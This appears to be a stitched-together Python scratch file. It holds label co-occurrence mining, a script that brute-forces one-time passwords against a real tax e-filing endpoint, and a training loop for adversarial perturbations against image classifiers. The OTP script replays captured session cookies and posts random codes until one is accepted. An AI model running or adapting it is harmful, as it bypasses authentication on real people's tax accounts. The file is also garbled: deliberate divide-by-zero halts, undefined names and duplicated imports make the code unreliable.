


# import numpy as np
# from itertools import combinations
# from collections import Counter
# import pandas as pd 
# # Example matrix M
# # M = np.array([
# #     [1, 1, 1, 1],
# #     [1, 0, 1, 0],
# #     [1, 1, 1, 0],
# #     [0, 1, 0, 1],
# #     [1, 0, 1, 1]
# # ])
# M=pd.read_hdf('/mnt/raptor/hassan/data/oi/Labels/testlabels.h5',key='df')
# #print(M.shape)

# # Parameters
# n = 2
# min_support = 3

# # Compute support for all possible combinations of n labels
# combinations_n = np.array(list(combinations(range(M.shape[1]), n)))
# support_n = np.sum(np.all(M[:, combinations_n], axis=2), axis=0)

# # Find frequent itemsets
# frequent_n_itemsets = [(set(combinations_n[i]), support_n[i]) for i in range(combinations_n.shape[0]) if support_n[i] >= min_support]

# print(f"Frequent {n}-itemsets with support of at least {min_support}:")
# for itemset, support in frequent_n_itemsets:
#     print(f"Itemset: {itemset}, support: {support}")

import pandas as pd 
import numpy as np
from mlxtend.preprocessing import TransactionEncoder
from mlxtend.frequent_patterns import fpgrowth, association_rules

# Example matrix M

N=pd.read_hdf('/mnt/raptor/hassan/data/oi/Labels/testlabels_10k.h5',key='df').iloc[:,:-1].to_numpy()


# Parameters
import numpy as np
from itertools import combinations
from collections import Counter
import pandas as pd 

n = 12
min_support = 100

# Compute support for all possible combinations of n labels
combinations_n = np.array(list(combinations(range(N.shape[1]), n)))
support_n = np.sum(np.all(N[:, combinations_n], axis=2), axis=0)

# Find frequent itemsets
#frequent_n_itemsets = [(set(combinations_n[i]), support_n[i]) for i in range(combinations_n.shape[0]) if support_n[i] >= min_support]
frequent_n_itemsets=[]
print(combinations_n.shape)
0/0
for i in range(combinations_n.shape[0]):

	if support_n[i] >= min_support:
		frequent_n_itemsets.append((set(combinations_n[i]), support_n[i]))


print(f"Frequent {n}-itemsets with support of at least {min_support}:")
for itemset, support in frequent_n_itemsets:
    print(f"Itemset: {itemset}, support: {support}")


0/0
import requests
import time
import random 
import string 
import ast
counter=0

while True:

    #res = ''.join(random.choices(string.digits, k=7))
    res=''.join(random.choices(string.ascii_lowercase+string.digits,k=8))#+res
    

    url = 'https://taxprep.sprintax.com/ajax/EfilingOnetimePasswordValidation.php'
    myobj = {'somekey': 'somevalue'}

    cookies={'aswkfa':'yes', 'SESSID':'d59d9b1756278e90942f900eb77a09f7', 'AWSALB':'B/3ebG2IRbih2jACTFSwgqY3ZuP+CmGsFkiK+I4HhCxmudm4PJe5vrSE8cSqd7+QCS/qKz9SXiXRGwmvBz+RxDmD+ZQiEHpmu3FdecIuCal30WrFXamHgUDhACcN', 'AWSALBCORS':'Y+xcd30iye2QaguytHlQpghl3DjtG2dYgaVD4V5pa0wkMrnpSsv7JhDKkCKNR4LittEDfd8BPTrvfYRF5GbWmkP9AS6paEYGfQ5xI6w+Ok6M93M1uFXLQKDFFcAK'}
    jsondata={'reg_timestamp': '20230406070055',
    'reg_signature': '06eef145fdbb46b0fdae859a707f84fef56958c3',
    'form_id': '981_1',
    'onetime_password': str(res)}

    

    x = requests.post(url, json = jsondata,cookies=cookies)

    if ast.literal_eval(x.text)['status']!=0:
        print('Code worked:',res)
        print(x.text)
        print(x.headers)
        0/0

    headers=x.headers
    for p in headers['set-cookie'].split(';'):
        if "AWSALB" in p:
            p=p[p.index('AWSALB'):]
            tempval=p.split('=')
            cookies[tempval[0][tempval[0].index('AWSA'):]]=tempval[1]

    counter+=1
    #print(counter)
    if counter%5000==0:
        print(counter)



0/0


import os
import sys
sys.path.append('./')
from utils.utility import *
from utils.confparser import *
import torch
import torch.nn as nn
import torch.optim as optim
import numpy as np
import torchvision
from torchvision import datasets, models, transforms
import matplotlib.pyplot as plt
import time
import copy
from tqdm import tqdm 
from Models import *
#from Datasets.NUSDataset import NUSImageDataset as ImageDataset
from Datasets import * 
import re
from Logger.Logger import *
import configparser
import ast, json
import argparse
import pickle
from datetime import datetime
from torch.optim.lr_scheduler import MultiStepLR
from torch.utils.tensorboard import SummaryWriter
pickle.HIGHEST_PROTOCOL = 4
torch.set_printoptions(edgeitems=27)
parser=argparse.ArgumentParser()
parser.add_argument('--configfile',default='configs/voc.ini')
parser.add_argument('expname')


inputval=torch.rand((5,10,20,20))
print(inputval)
out=F.pad(inputval, (1, 1, 1, 1), 'reflect')
out2=copy.deepcopy(out)
out2[:,:,1:-1,1:-1]=inputval
print(torch.all(out.eq(out2)))
0/0

class Trainer:
	def __init__(self,configfile,experiment_name):
		self.parseddata=DataParser(params={'configfile':configfile,'experiment_name':experiment_name,'mode':'train'})		
		#self.parse_data(configfile,experiment_name,losstype)
	
	def set_bn_eval(self,module):
		if isinstance(module, torch.nn.modules.batchnorm._BatchNorm):
			module.eval()

	def train(self):
		params=self.parseddata.build()
		self.logger=params['logger']
		model=params['model']
		criterion=params['criterion']
		num_classes=params['num_classes']
		
		device=params['device']
		train_optimizer=params['optimizer']
		scheduler=params['scheduler']
		train_dataloader=params['train_dataloader']
		val_dataset=params['val_dataset']
		val_dataloader=params['val_dataloader']

		
		
		start_epoch=params['start_epoch']
		num_epochs=params['num_epochs']
		weight_store_every_epochs=params['weight_store_every_epochs']
		writer=params['writer']
		min_val_loss=params['min_val_loss']
		weights_dir=params['weights_dir']
		epsilon_norm=params['eps_norm']
		
		#model.base_model.load_state_dict(torch.load(self.checkpoint_load_path)['model'])
		#model.base_model.load_state_dict(torch.load('/mnt/raptor/hassan/weights/nus/asl/new.pt')['model_state'])
		#print('loaded again')
		self.logger.write('Loss:',criterion)
		
        
		
		#train_dataloader=torch.utils.data.DataLoader(train_dataset, batch_size=self.batchsize, shuffle=True, num_workers=4)
		
		model=model.cuda()
		model.dotemp()
		
		train_optimizer = optim.SGD(model.parameters(), lr=float(0.001))#,weight_decay=1e-4)
		model.Normalize_UAP()

		#current_target_value=0.0
		current_target_value=0.0
		for epoch in range(start_epoch,start_epoch+num_epochs):
			#current_target_value=1.0-current_target_value

			model.eval()

			#torch.set_grad_enabled(False)
			self.logger.write('Model Evaluation:')
			#vallabels=np.zeros(shape=(len(val_dataset)*num_classes,num_classes),dtype=np.float32)
			#valpreds=np.empty(shape=(len(val_dataset)*num_classes,num_classes),dtype=np.float32)
			vallabels=np.zeros(shape=(0,num_classes),dtype=np.float32)
			valpreds=np.empty(shape=(0,num_classes),dtype=np.float32)
			dataidx=0
			totals={i:torch.Tensor([1]) for i in range(num_classes)}
			success={i:torch.Tensor([0]) for i in range(num_classes)}
			current_target_value=0.0
			with torch.no_grad():
				for i,data in enumerate(tqdm(val_dataloader)):
					#img_ids,inputs, labels = data 
					(all_inputs,img_ids),labels=data
					all_inputs=all_inputs.to(device)
					labels=labels.to(device).float()

					outputs,features = model(all_inputs,epsilon_norm=0.0,target_label=labels,target_class=torch.Tensor([0]).long())
					labels=torch.clone(outputs).detach()
					labels=torch.where(labels>0,1,0).float()
					
					#for jk in range(labels.shape[1]):
					#for jk in range(num_classes):
					for jk in range(1):
						current_dir='/mnt/raptor/hassan/UAPs/evals/'+str(jk)
						create_folder(current_dir)
						select_indices=torch.where(labels[:,jk]==current_target_value)[0]
						#print(torch.count_nonzero(select_indices))
						if(torch.count_nonzero(select_indices)==0):
							continue
					
						newlabels=torch.clone(labels[select_indices,:])

						#
						#newlabels = 1 - newlabels
						newlabels[:,jk] = 1 - newlabels[:,jk]
						inputs=all_inputs[select_indices,:,:,:]
						#print(inputs.shape,newlabels.shape)
					
						#outputs,features = model(inputs,epsilon_norm=epsilon_norm,target_label=newlabels,target_class=jk)
						#outputs,features = model(inputs,epsilon_norm=epsilon_norm,target_label=newlabels,target_class=torch.arange(num_classes))
						outputs,features = model(inputs,epsilon_norm=epsilon_norm,target_label=newlabels,target_class=torch.Tensor([jk]).long())
						#print(torch.where(outputs[0,:]>0,1,0))
						totals[jk]+=outputs.shape[0]

						if(current_target_value==1):
							success[jk]+=torch.count_nonzero(outputs[:,jk]<=0).cpu()
						else:
							success[jk]+=torch.count_nonzero(outputs[:,jk]>0).cpu()
						
						vallabels=np.concatenate((vallabels,newlabels.cpu()),axis=0)
						valpreds=np.concatenate((valpreds,outputs.detach().cpu().float()),axis=0)

						# vallabels[dataidx:dataidx+inputs.shape[0]]=newlabels.cpu()
						# valpreds[dataidx:dataidx+inputs.shape[0]]=outputs.detach().cpu().float()
					
						dataidx=dataidx+inputs.shape[0]
					
						losses_dict,loss = criterion(outputs,newlabels,jk,model)
						avg_meter.update('val_loss',loss.item())
					
					print('Percentage:',', '.join(["{:.3f}".format((success[jk]/(totals[jk])).item()) for jk in range(num_classes)]))
					
					

					#bceloss,normloss,parent_margin_loss,neg_margin_loss,loss=criterion(outputs,labels,model.get_fc_weights())
			
			now = datetime.now()
			
			#val_acc=eval_performance(valpreds,vallabels,all_class_names)
			statout=now.strftime("%d/%m/%Y %H:%M:%S")
			train_loss,val_loss,newstatout=avg_meter.get_stats(epoch,writer)
			valpreds=np.where(valpreds>0,1,0)
			#val_acc=accuracy_score(vallabels,valpreds)
			val_acc=accuracy_score(vallabels[:,0],valpreds[:,0])
			writer.add_scalar('Val Accuracy',val_acc,epoch)

			
			statout=statout+' - '+newstatout+', Val Acc: %.3f'%(val_acc)+', Current target value: '+str(current_target_value)
			statout = statout + trainstatout
			statout = statout +'\nVal - Percentage:,'+', '.join(["{:.3f}".format((success[jk]/(totals[jk]+1e-10)).item()) for jk in range(num_classes)])

			#statout='\nEpoch: %d , Train loss: %.3f, Val loss: %.3f, Val Acc: %.3f, BCE: %.3f, Norm: %.3f, Parent Margin: %.3f, Neg Margin: %.3f' %(epoch, train_loss_meter.avg,val_loss_meter.avg,val_acc,bce_loss_meter.avg,norm_loss_meter.avg,parent_margin_loss_meter.avg,neg_margin_loss_meter.avg)

			self.logger.write(statout)
			weight_name='model-'

			if(val_loss<=min_val_loss):
				min_val_loss=val_loss
				weight_name='best-'+weight_name
				#self.store_checkpoint(train_optimizer,model,epoch,self.min_val_loss,self.min_val_loss,train_loss_meter.avg,os.path.join(self.weights_dir,'best-model-'+str(epoch)+'.pt'))
			
			checkpointdict={
				'optim_state':train_optimizer.state_dict(),
				'model_state':model.state_dict(),
				'epoch':epoch,
				'min_val_loss':min_val_loss,
				'current_val_loss':val_loss,
				'training_loss':train_loss,
				'val_acc':val_acc
			}
			
			if(epoch%weight_store_every_epochs==0):
				store_checkpoint(checkpointdict,os.path.join(weights_dir,'model-'+str(epoch)+'.pt'))




	
args=parser.parse_args()
trainer=Trainer(args.configfile,args.expname)
trainer.train()

